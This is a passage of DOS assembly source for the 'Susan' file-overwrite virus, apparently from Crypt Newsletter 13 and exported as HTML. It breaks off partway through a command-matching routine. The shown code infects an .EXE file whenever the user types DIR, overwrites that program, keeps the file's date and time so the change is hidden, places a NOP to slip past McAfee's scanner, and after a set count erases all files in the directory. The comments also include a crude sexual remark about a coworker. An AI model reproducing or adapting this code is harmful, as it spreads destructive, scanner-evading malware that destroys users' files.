<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Susan virus: included in Crypt Newsletter 13</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; COMMENT *</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      Susan Virus, Strain A</span><span class="sc0">
</span><span class="sc1">;      Written by NB</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      This program needs to be assembled with Turbo Assembler.</span><span class="sc0">
</span><span class="sc1">;      Special thanks go to Richard S. Sadowsky of TurboPower Software</span><span class="sc0">
</span><span class="sc1">;      for the help on using INT 2F with those majick functions!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      This is an example of an interesting technique for writing a virus</span><span class="sc0">
</span><span class="sc1">;      that is terminate-and-stay-resident.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      Description:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Susan is a file overwrite virus.  Named for a woman in my department</span><span class="sc0">
</span><span class="sc1">;         who is overly concerned about virii, but has no idea about what the</span><span class="sc0">
</span><span class="sc1">;         fuck they actually are.  She also has real nice tits.  This is a TSR</span><span class="sc0">
</span><span class="sc1">;         that only infects .EXE files.  Each time the user types "DIR", the</span><span class="sc0">
</span><span class="sc1">;         first .EXE file found is infected.  After 15 such infections, then</span><span class="sc0">
</span><span class="sc1">;         each time DIR is typed, all files are erased in that directory.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Infected .EXEs are destroyed and will not run.  Attempts to run them</span><span class="sc0">
</span><span class="sc1">;         will display the message "Bad command or file name" message.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      Interesting Features:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          - File size and date-stamp of infected file is maintained.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          - Uses Vienna Virus technique of using the file time to determine</span><span class="sc0">
</span><span class="sc1">;            if a target file is infected.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          - Infects and zaps everytime the user types a plain DIR command.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          - Hooks INT 2F for handling the DIR command.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          - Hooks INT 2F AX=010F (PRINT.COM int) to determine if the virus in</span><span class="sc0">
</span><span class="sc1">;            installed in memory.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;          - Writes the bug directly from memory.</span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">small</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">LOCALS</span><span class="sc0"> </span><span class="sc5">@@</span><span class="sc0">

</span><span class="sc9">ORG</span><span class="sc0">             </span><span class="sc2">100h</span><span class="sc0">                   </span><span class="sc1">; for COM file</span><span class="sc0">

</span><span class="sc5">DTA</span><span class="sc0">     </span><span class="sc9">STRUC</span><span class="sc0">                     </span><span class="sc1">; used for file searching</span><span class="sc0">
        </span><span class="sc5">dtaReserved</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">dtaAttrib</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dtaTime</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dtaDate</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dtaSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dtaName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DTA</span><span class="sc0">     </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">DPL</span><span class="sc0">     </span><span class="sc9">STRUC</span><span class="sc0">                      </span><span class="sc1">; DOS Parameter List used for undoc funcs</span><span class="sc0">
        </span><span class="sc5">dplAX</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dplBX</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dplCX</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dplDX</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dplSI</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dplDI</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dplDS</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dplES</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">dplCID</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; computer ID (0 = current system)</span><span class="sc0">
        </span><span class="sc5">dplPID</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; process ID (PSP on specified computer)</span><span class="sc0">
</span><span class="sc5">DPL</span><span class="sc0">     </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">Pointer</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                      </span><span class="sc1">; nice structure for a pointer type</span><span class="sc0">
        </span><span class="sc5">Ofst</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Segm</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Pointer</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Initialize</span><span class="sc0">

</span><span class="sc5">OurCommandLen</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">PathOfs</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; Use command tail of PSP as path buffer</span><span class="sc0">
</span><span class="sc5">FuckMeNow</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">virSig</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc12">'uS'</span><span class="sc0">  </span><span class="sc1">; Don't delete this line...</span><span class="sc0">
</span><span class="sc5">virName</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'san'</span><span class="sc0"> </span><span class="sc1">;      ...this is the Susan Virus!</span><span class="sc0">
</span><span class="sc5">EofMarker</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">26</span><span class="sc0">
</span><span class="sc5">OldInt2F</span><span class="sc0">        </span><span class="sc5">Pointer</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">FNameLen</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DeleteDPL</span><span class="sc0">       </span><span class="sc5">DPL</span><span class="sc0">     </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">FuckCount</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SaveDTA</span><span class="sc0">         </span><span class="sc5">Pointer</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">TargetMask</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Victim</span><span class="sc0">          </span><span class="sc5">DTA</span><span class="sc0">     </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">OurCmd</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DIR'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">

</span><span class="sc5">IsInfected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; This will detect if the .exe is already infected.  We are using</span><span class="sc0">
        </span><span class="sc1">; a nifty technique pulled from the Vienna Virus.  If the file's</span><span class="sc0">
        </span><span class="sc1">; seconds is 62, then that file is infected.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Victim.dtaTime</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">  </span><span class="sc1">; &gt;60 seconds</span><span class="sc0">
        </span><span class="sc1">; JZ  infected</span><span class="sc0">
        </span><span class="sc1">; JNZ not infected</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">SearchExec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; Returns AX = 1 if a uninfected file found</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                 </span><span class="sc1">; Search for an .EXE file</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TargetMask</span><span class="sc0">  </span><span class="sc1">; DS has seg</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">@@AlreadyInfected</span><span class="sc0">     </span><span class="sc1">; No .exes in this directory</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">IsInfected</span><span class="sc0">            </span><span class="sc1">; Is this file infected?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">@@NotInfectedYET</span><span class="sc0">

        </span><span class="sc1">; Need to look for next file (maybe next version, haha)</span><span class="sc0">

</span><span class="sc5">@@AlreadyInfected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; Zeros out AX </span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">@@NotInfectedYET</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; Return a &lt;&gt; Zero indicator: Boolean</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">CopySelf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Victim.dtaName</span><span class="sc0">  </span><span class="sc1">; Open file for read/write</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Clear all attributes to NORMAL</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">    </span><span class="sc1">; Now open up the file... Don't worry now about nets</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; read/write access</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; Write the virus to the start of the open file</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">                      </span><span class="sc1">; Start of virus</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EndOBug</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc1">; total size of virus</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">                </span><span class="sc1">; WOW! this NOP will suppresses McAfees' scan from</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">        </span><span class="sc1">; thinking this is a VR [FR] virus!</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Victim.dtaDate</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Victim.dtaTime</span><span class="sc0">   </span><span class="sc1">; We gotta fix up the file's datestamp</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001Fh</span><span class="sc0">            </span><span class="sc1">; And set the time to 62 seconds!</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                  </span><span class="sc1">; ala Vienna Virus</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">              </span><span class="sc1">; Close up the file - we're done</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">Manipulate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">; Uh...Save registers?</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">; get Canonical pathname</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc5">FuckCount</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FuckMeNow</span><span class="sc0">  </span><span class="sc1">; Do we start the deletes or just infect?</span><span class="sc0">
        </span><span class="sc6">JL</span><span class="sc0">      </span><span class="sc5">@@InfectCity</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">PathOfs</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">   </span><span class="sc1">; Mask to delete</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DeleteDPL</span><span class="sc0">   </span><span class="sc1">; Build DOS Parameter List</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc5">.dplAX</span><span class="sc4">,</span><span class="sc2">4100h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc5">.dplDS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc5">.dplDX</span><span class="sc4">,</span><span class="sc5">PathOfs</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc5">.dplES</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc5">.dplCID</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc5">.dplPID</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; Make DOS Server Function Call</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5D00h</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Infect more here...</span><span class="sc0">
</span><span class="sc5">@@InfectCity</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2FH</span><span class="sc0">             </span><span class="sc1">; get the current DTA address</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">SaveDTA.Segm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Save it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">SaveDTA.Ofst</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">victim</span><span class="sc0">   </span><span class="sc1">; Set DTA to this glob of memory</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SearchExec</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">@@InfectNot</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CopySelf</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc5">FuckCount</span><span class="sc0">       </span><span class="sc1">; Track the time until eating files...</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">                 </span><span class="sc1">; Restore the DTA</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SaveDTA.Segm</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SaveDTA.Ofst</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

</span><span class="sc1">; And return to the way it was...</span><span class="sc0">
</span><span class="sc5">@@InfectNot</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

</span><span class="sc1">; If you want the DOS command to not execute, then you just need to uncomment</span><span class="sc0">
</span><span class="sc1">; out the next line:</span><span class="sc0">

</span><span class="sc1">;       MOV     BYTE PTR [SI],0          ; clear out the command string</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">; convert pascal style string in DS:SI to uppercase</span><span class="sc0">
</span><span class="sc5">UpperCaseSt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@UpcaseCh</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Oh well, not too hard...</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc12">'a'</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">@@NotLower</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc12">'z'</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">@@NotLower</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc12">'a'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc5">@@NotLower</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">@@UpcaseCh</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">; zf set if match, zf not set if no match</span><span class="sc0">
</span><span class="sc5">IsMatch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; NOTE: ds:bx has command line</span><span class="sc0">
        </span><span class="sc1">;       ofs 0 has max length of command line</span><span class="sc0">
        </span><span class="sc1">;       ofs 1 has count of bytes to follow command line text,</span><span class="sc0">
        </span><span class="sc1">;         terminated with 0Dh</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
